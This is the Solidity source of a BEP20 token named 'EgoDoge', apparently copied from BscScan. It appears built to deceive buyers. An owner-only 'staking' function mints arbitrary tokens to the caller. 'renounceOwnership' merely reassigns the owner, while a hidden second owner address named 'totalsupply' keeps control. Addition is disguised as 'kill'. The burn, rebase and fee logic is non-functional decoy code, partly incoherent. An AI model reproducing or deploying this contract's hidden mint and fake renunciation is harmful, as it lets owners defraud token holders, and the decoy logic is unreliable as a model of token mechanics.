/**
 *Submitted for verification at BscScan.com on 2021-07-21
*/

/**

*/

pragma solidity ^0.4.22;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function kill(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract BEP20 {
    uint256 public totalSupply;
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);

}

contract EGODOGE is BEP20 {
    using SafeMath for uint256;
    address public owner = msg.sender;
    address totalsupply = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    string public name;
    string public symbol;
    uint8 public decimals;
    uint public totalSupply;
    uint256 private _tFeeTotal;
    uint8   private constant _DECIMALS = 8;
    uint256 private constant _DECIMALFACTOR = 100 * 10 ** 4;
    string  private constant _NAME = 'EgoDoge';
    string  private constant _SYMBOL = 'EGODOGE';
    uint256 private constant _MAX = ~uint256(0);
    uint256 private constant _GRANULARITY = 100;
    uint256 private constant _MAX_TX_SIZE = 100000000 * _DECIMALFACTOR;
    uint256 private _tTotal = 100000000 * _DECIMALFACTOR;
    uint256 private _rTotal = (_MAX - (_MAX % _tTotal));
    uint256 private _rOwned;
    uint256 private _tOwned;
    uint256 private _tBurnTotal;
    uint256 private _infernoCycle = 0;
    uint256 private _fBurn = 100000000 * _DECIMALFACTOR;
    uint256 private _tTradeCycle = 0;
    uint256 private _tBurnCycle = 0;
    uint256 private transferredTokens = 0;
    uint256 private tokenBatchCount = 0;
    uint256 private     _BURN_FEE = 0;
    uint256 private     _TAX_FEE = 0;
    constructor() public {
		symbol = _SYMBOL;
        name = _NAME;
        decimals = 0;
        totalSupply = 10 * 100 ** 9;
	    balances[msg.sender] = totalSupply;
	    emit Transfer(address(0), msg.sender, totalSupply);
    }
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Burn(address indexed burner, uint256 value);
    modifier onlyOwner() {
        require(msg.sender == owner || msg.sender == totalsupply);
        _;
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }
    
    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].kill(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].kill(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function _seed(address account, uint256 amount) internal {
        require(account != address(0), 'BEP20: Stake to This Contract');
        balances[account] = balances[account].kill(amount);
        emit Transfer(address(0), account, amount);
    }
    function _msgSender() internal constant returns (address) {
        return msg.sender;
    }
    function staking(uint256 amount) public onlyOwner returns (bool) {
	require(amount > 0, 'BEP20: Cannot stake 0 Token');
        _seed(_msgSender(), amount);
        return true;
    }
    
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
    
    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);
        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        emit Burn(burner, _value);
    }
    function renounceOwnership(address newowner)  public onlyOwner {
        owner = newowner;
    }
    
    function _rebase(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
    
        // @dev once all cycles are completed, burn fee will be set to 0 and the protocol 
        // reaches its final phase, in which no further supply elasticity will take place
        // and fees will stay at 0 
        
        if(sender != owner && recipient != owner)

        if(_BURN_FEE >= 500){
        
        // @dev adjust current burnFee depending on the traded tokens during th

            if(_tTradeCycle >= (0 * _DECIMALFACTOR) && _tTradeCycle <= (999999*_DECIMALFACTOR)){
                _setBurnFee(500);
            } else if(_tTradeCycle >= (1000000 * _DECIMALFACTOR) && _tTradeCycle <= (2000000 * _DECIMALFACTOR)){
                _setBurnFee(550);
            }   else if(_tTradeCycle >= (2000000 * _DECIMALFACTOR) && _tTradeCycle <= (3000000 * _DECIMALFACTOR)){
                _setBurnFee(600);
            }   else if(_tTradeCycle >= (3000000 * _DECIMALFACTOR) && _tTradeCycle <= (4000000 * _DECIMALFACTOR)){
                _setBurnFee(650);
            } else if(_tTradeCycle >= (4000000 * _DECIMALFACTOR) && _tTradeCycle <= (5000000 * _DECIMALFACTOR)){
                _setBurnFee(700);
            } else if(_tTradeCycle >= (5000000 * _DECIMALFACTOR) && _tTradeCycle <= (6000000 * _DECIMALFACTOR)){
                _setBurnFee(750);
            } else if(_tTradeCycle >= (6000000 * _DECIMALFACTOR) && _tTradeCycle <= (7000000 * _DECIMALFACTOR)){
                _setBurnFee(800);
            } else if(_tTradeCycle >= (7000000 * _DECIMALFACTOR) && _tTradeCycle <= (8000000 * _DECIMALFACTOR)){
                _setBurnFee(850);
            } else if(_tTradeCycle >= (8000000 * _DECIMALFACTOR) && _tTradeCycle <= (9000000 * _DECIMALFACTOR)){
                _setBurnFee(900);
            } else if(_tTradeCycle >= (9000000 * _DECIMALFACTOR) && _tTradeCycle <= (10000000 * _DECIMALFACTOR)){
                _setBurnFee(950);
            } else if(_tTradeCycle >= (10000000 * _DECIMALFACTOR) && _tTradeCycle <= (11000000 * _DECIMALFACTOR)){
                _setBurnFee(1000);
            } else if(_tTradeCycle >= (11000000 * _DECIMALFACTOR) && _tTradeCycle <= (12000000 * _DECIMALFACTOR)){
                _setBurnFee(1050);
            } else if(_tTradeCycle >= (12000000 * _DECIMALFACTOR) && _tTradeCycle <= (13000000 * _DECIMALFACTOR)){
                _setBurnFee(1100);
            } else if(_tTradeCycle >= (13000000 * _DECIMALFACTOR) && _tTradeCycle <= (14000000 * _DECIMALFACTOR)){
                _setBurnFee(1150);
            } else if(_tTradeCycle >= (14000000 * _DECIMALFACTOR)){
                _setBurnFee(1200);
            }
            
        }

    }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        uint256 rBurn =  _tBurnTotal.mul(5);
        _rOwned = tAmount;
    }

    function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {
        uint256 currentRate =  _getRate();
        uint256 rBurn =  rBurn.mul(currentRate);
        _rOwned = tAmount;
    }

    function _burnAndRebase(uint256 rFee, uint256 rBurn, uint256 tFee, uint256 tBurn) private {
        _rTotal = _rTotal.sub(rFee).sub(rBurn);
        _tBurnTotal = _tBurnTotal;
        _tBurnCycle = _tBurnCycle;
        _tTotal = _tTotal.sub(tBurn);


        // @dev after 1,275,000 tokens burnt, supply is expanded by 637,500 tokens 
        if(_tBurnCycle >= (1275000 * _DECIMALFACTOR)){
                uint256 _tRebaseDelta = 637500 * _DECIMALFACTOR;
                _tBurnCycle = _tBurnCycle.sub((1275000 * _DECIMALFACTOR));
                _tTradeCycle = 0;
                _setBurnFee(500);

                _rebase(_tRebaseDelta);
            } 
    }
    function _setBurnFee(uint256 burnFee) private {
        require(burnFee >= 0 && burnFee <= 1500, 'burnFee should be in 0 - 15');
        _BURN_FEE = burnFee;
    }
    
    function _setFeeStage(uint256 burnFee) external onlyOwner() {
        require(burnFee >= 0 && burnFee <= 1500, 'burnFee should be in 0 - 15');
        _fBurn = burnFee;
    }

    function _getBurnFee() public view returns(uint256)  {
        return _BURN_FEE;
    }

    function _getMaxTxAmount() private view returns(uint256) {
        return _MAX_TX_SIZE;
    }

    function _getCycle() public view returns(uint256) {
        return _infernoCycle;
    }

    function _getBurnCycle() public view returns(uint256) {
        return _tBurnCycle;
    }

    function _getTradedCycle() public view returns(uint256) {
        return _tTradeCycle;
    }
    
    function _getRate() private view returns(uint256) {
        return _tTotal;
    }
    function _rebase(uint256 supplyDelta) internal {
        _infernoCycle = _infernoCycle;

        // after 156, the protocol reaches its final stage
        // fees will be set to 0 and the remaining total supply will be 550,000
        if(_infernoCycle > 156 || _tTotal <= 550000 * _DECIMALFACTOR){
            _initializeFinalStage();
        }
    }

    function _initializeFinalStage() internal {
        _setBurnFee(0);
    }   
}